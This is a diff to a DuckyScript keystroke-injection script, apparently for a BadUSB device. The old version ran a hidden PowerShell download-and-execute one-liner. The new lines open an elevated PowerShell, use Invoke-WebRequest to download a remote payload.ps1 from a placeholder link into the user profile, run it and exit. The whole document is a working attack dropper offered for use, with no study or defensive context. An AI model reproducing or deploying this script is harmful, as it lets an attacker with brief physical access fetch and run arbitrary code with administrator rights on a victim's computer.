@@ -1,10 +1,24 @@
 DELAY 1000
 GUI r
-DELAY 300
+DELAY 1000
+STRING powershell start-process PowerShell -verb runas
+DELAY 900
+ENTER
+DELAY 3500
 REM Put Your PowerShell Scripts Link Here
-STRING powershell -w h iex (irm "link")
-DELAY 200
-CTRL-SHIFT-ENTER
+STRING Invoke-WebRequest -Uri "link do seu payload.ps1 com tudo preenchido" -OutFile "$env:USERPROFILE\payload.ps1"
+DELAY 900
+ENTER
 DELAY 3000
-ALT y
-DELAY 100
+STRING cd $env:USERPROFILE
+DELAY 700
+ENTER
+DELAY 750
+STRING ./payload.ps1
+DELAY 600
+ENTER
+DELAY 1000
+STRING exit
+DELAY 600 
+ENTER
+
